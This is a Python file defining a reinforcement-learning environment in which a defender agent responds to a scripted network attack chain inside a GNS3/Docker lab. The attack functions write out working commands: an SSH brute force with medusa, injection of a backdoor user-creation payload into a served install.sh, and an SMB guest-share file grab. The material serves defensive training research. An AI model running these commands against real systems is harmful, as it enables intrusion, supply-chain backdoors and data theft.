from network_interactions import *  # Import your functions
import gymnasium as gym
from gymnasium import spaces
import numpy as np
from constants import *
import re
import xml.etree.ElementTree as ET

class NetworkDefenseEnv(gym.Env):
    def __init__(self):
        print("Init")

        self.docker_ids = {}
        self.gns3_ids = {}

        self.attack_chain = [
            scan_range,
            brute_force,
            traffic_scan,
            inject_script,
            get_info,
            read_info
        ]

        self.attack_index = 0

        # 4 categories (detection, mitigation, containment, idle)
        types = 4
        commands = 3
        nodes = 4
        users = 3
        rules = 3

        self.action_space = spaces.MultiDiscrete(
            [types, commands, nodes, users, rules])
        
        self.observation_space = spaces.Dict({
            "snort_alerts": spaces.Box(low=0, high=np.inf, shape=(5,), dtype=np.int32),
            "firewall_logs": spaces.MultiBinary(5),  
            "hosts_up": spaces.MultiBinary(4),
            "hosts_down": spaces.MultiBinary(4)
        })

        self.current_observation = {
            "snort_alerts": np.zeros(5, dtype=np.int32),
            "firewall_logs": np.zeros(5, dtype=np.int8),
            "hosts_up": np.zeros(4, dtype=np.int8),
            "hosts_down": np.zeros(4, dtype=np.int8)       
        }

    def step(self, action, atk_reward=0):
        response_type = action[0]
        specific_action = action[1]
        node = action[2]
        user = action[3]
        rule = action[4]

        # Detection
        if response_type == 0:
            if specific_action == 0:
                print("Add snort rule")
                #self.add_snort_rule(rule)

            elif specific_action == 1:
                print("Add firewall rule")
                #self.add_firewall_rule(rule)

        # Mitigation
        elif response_type == 1:
            if specific_action == 0:
                print("Limit traffic")
                #self.limit_traffic(node)

            elif specific_action == 1:
                print("Blacklisting IP")
                self.blacklist_ip(node)

            elif specific_action == 2:
                print("Limiting user")
                #self.limit_user(node, user)

        # Containment
        elif response_type == 2:
            if specific_action == 0:
                print(f"Turning off {constants.DEFENSE_NODES[node]}")
                self.turn_off_node(node)

            elif specific_action == 1:
                print(f"Isolating {constants.DEFENSE_NODES[node]}")
                self.isolate_node(node)
        
        elif response_type == 3:
            self.idle()
        
        info_stolen = False
        # Attacker's turn
        if self.attack_index < len(self.attack_chain):
            # Execute the next step in the attack chain
            print(f"Executing attack step {self.attack_index + 1}")
            if self.attack_index == len(self.attack_chain) - 1:
                info_stolen = self.attack_chain[self.attack_index](self.docker_ids)
            else: 
                self.attack_chain[self.attack_index](self.docker_ids)
            self.attack_index += 1

        node_statuses = self.retrieve_node_status()

        print("Evaluating state..")
        self.current_observation["snort_alerts"] = self.retrieve_snort_logs()
        self.current_observation["firewall_logs"] = self.retrieve_firewall_logs()
        self.current_observation["hosts_up"] = node_statuses["hosts_up"]
        self.current_observation["hosts_down"] = node_statuses["hosts_down"]
        
        print(self.current_observation)
        reward = float(20 - 2*np.sum(self.current_observation["hosts_down"]) - 20*info_stolen)
        terminated = self.attack_index == len(self.attack_chain)
        truncated = False
        print("Step done\n", terminated)
        return self.current_observation.copy(), reward, terminated, truncated, {}
    
    def reset(self, seed=None, options=None):
        print("Resetting..")
        self.current_observation = {
            "snort_alerts": np.zeros(5, dtype=np.int32),
            "firewall_logs": np.zeros(5, dtype=np.int8),
            "hosts_up": np.zeros(4, dtype=np.int8),
            "hosts_down": np.zeros(4, dtype=np.int8),
        }

        self.attack_index = 0
        restart_sim()
        self.start_all()
        self.gns3_ids, self.docker_ids = collect_node_ids()
        start_snort(self.docker_ids)

        return self.current_observation, {}
    
# Detection
    # Adds a random snort rule from constants.py and restarts snort to apply rule
    def add_snort_rule(self, index):
        rule = constants.SNORT_RULES[index]
        command = (
            f'echo "{rule}" >> /var/snort/local.rules'
        )
        execute_command(self.docker_ids["IDPS"], command)
        restart_snort(self.docker_ids)

    # Adds shorewall rule from constants.py, restarts shorewall to apply
    def add_firewall_rule(self, index):
        rule = constants.SHOREWALL_RULES[index]
        command = (f'echo "{rule}" >> /etc/shorewall/rules'
                   '&& shorewall restart')
        execute_command(self.docker_ids["IDPS"], command)

# Mitigation

    # Adds target IP to blacklist and restarts firewall to apply updated blacklist
    def blacklist_ip(self, node_id):
        target_ip = '10.0.0.2'
        command = (
            f'echo REJECT net:{target_ip} all all >> /etc/shorewall/rules '
            '&& shorewall reload'
        )
        execute_command(node_id, command)

    def limit_user(self, node_id, user):
        command = f'deluser {constants.USERS[user]} sudo'
        execute_command(node_id, command)

    def limit_traffic(self, node_id):
        command = 'not implemented'
        execute_command(node_id, command)

# Containment
    def turn_off_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.gns3_ids[name]
        stop_node(id)
        print(f"Node {name} turned off")

    def isolate_node(self, node_id):
        command = "ifconfig eth0 down"
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        execute_command(id, command)

# Idle
    def idle(self):
        print("idle, do nothing")

# Other (maybe not usable here)

    def start_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        start_node(id)
        print(f"Node {node_id} restarted")

    def restart_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        restart_node(id)
        print(f"Node {node_id} restarted")

    def start_all(self):
        start_nodes()
    
    def restart(self):
        restart_sim()

# Observation methods

    def retrieve_snort_logs(self):
        command = "cat /var/log/snort/alert"
        node = self.docker_ids["IDPS"]
        output_data = execute_command(node, command)
        print("OUT", output_data)

        # Pattern for regular snort log output
        alert_pattern = re.compile(
            r'(?P<timestamp>\d{2}/\d{2}-\d{2}:\d{2}:\d{2}\.\d+)\s+\[\*\*\]\s+\[(?P<sid>\d+):(?P<gid>\d+):(?P<rev>\d+)\]\s+(?P<alert_msg>[^\[]+)\s+\[\*\*\]\s+'
            r'\[Classification:\s+(?P<classification>[^\]]+)\]\s+\[Priority:\s+(?P<priority>\d+)\]\s+\{(?P<protocol>\w+)\}\s+'
            r'(?P<src_ip>\d+\.\d+\.\d+\.\d+)(:(?P<src_port>\d+))?\s*->\s*(?P<dst_ip>\d+\.\d+\.\d+\.\d+)(:(?P<dst_port>\d+))?',
            re.MULTILINE
        )
    
        priorities = [int(match.group('priority')) for match in alert_pattern.finditer(output_data)]

        max_priority_levels = 5
        priority_counts = np.zeros(max_priority_levels, dtype=np.int32)

        for priority in priorities:
            if 1 <= priority <= max_priority_levels:  
                priority_counts[priority] += 1  # Map priority 1 to index 0, priority 2 to index 1, etc.

        return priority_counts

    def retrieve_node_status(self):
        URL = ('http://192.168.33.7:3080/v2/projects/'
           f'{constants.PROJECT_ID}/nodes')
     
        response = requests.get( URL, headers={'Content-Type': 'application/x-www-form-urlencoded', })
        if response.status_code == 200:
            data = response.json()
        else:
            print("Failed to fetch data. Status code:", response.status_code)

        nodes_on = 0
        nodes_off = 0
        for node in data:
            if node['status'] == 'started':
                nodes_on += 1
            else:
                nodes_off += 1

        hosts_up = np.array([1 if i < nodes_on else 0 for i in range(4)], dtype=np.int8)
        hosts_down = np.array([1 if i < nodes_off else 0 for i in range(4)], dtype=np.int8)

        return {
            "hosts_up": hosts_up,
            "hosts_down": hosts_down
        }
    
    def retrieve_firewall_logs(self):
        return np.zeros(5, dtype=np.int8)
    
def start_snort(docker_ids):
    command = 'snort -c /etc/snort/snort.conf -i eth0 -i eth1 -i eth2 -A fast -l /var/log/snort -D'
    execute_command(docker_ids["IDPS"], command)

def restart_snort(docker_ids):
    command = "pgrep snort"
    pid = execute_command(docker_ids["IDPS"], command)
    stop_command = f"kill -9 {pid}"
    execute_command(docker_ids["IDPS"], stop_command)
    start_snort()


### Scripted attacks
# Exploration
def scan_range(docker_ids):
    command = constants.NMAP_SCAN + ' 192.42.0.10'
    print(f"Port scanning")
    result = execute_command(docker_ids["COZYBEAR"], command)
    return result

def traffic_scan(docker_ids):
    command = "timeout 5 tcpdump -i any -v"
    result = execute_command(docker_ids["MgmHost"], command)
    print(result)
    return result

# Exploitation
def brute_force(docker_ids):
    command = f'medusa -h 192.42.0.10 -U /seclists/usr.txt -P /seclists/pass.txt -M ssh | grep FOUND'
    print("Brute Forcing")
    result = execute_command(docker_ids["COZYBEAR"], command)
    return result

def inject_script(docker_ids):
    payload = "useradd -m -s /bin/bash dylan && echo 'dylan:h4ck3d' | chpasswd"
    command = f'sh -c "echo \\"{payload}\\" >> /var/www/html/reposerver/install.sh"'
    result = execute_command(docker_ids["RepoServer"], command)

def get_info(docker_ids):
    command = r'smbclient //192.168.100.3/Fileshare -U guest%guest -c "prompt off; mget *"'
    result = execute_command(docker_ids["AdminPC"], command)

def read_info(docker_ids):
    command = "cat financial_report.txt"
    result = execute_command(docker_ids["AdminPC"], command)
    if result == "This is a confidential report":
        return True
    return False

def collect_node_ids():
    URL = 'http://192.168.33.7:3080/v2/projects/31d6b89d-08f6-4eba-8d7d-0ed7a19579b4/nodes'
    response = requests.get(URL, headers={})
    gns3_dic = {}
    docker_dic = {}
    for node in response.json():
        #print(node['name'], node['node_id'])
        gns3_dic[node['name']] = node['node_id']

        if 'docker' in node['node_type']:
            name = node['name']
            id = node ['properties']['container_id'][:12]
            docker_dic[name] = id
            # print(name)
            # print(id)
    return gns3_dic, docker_dic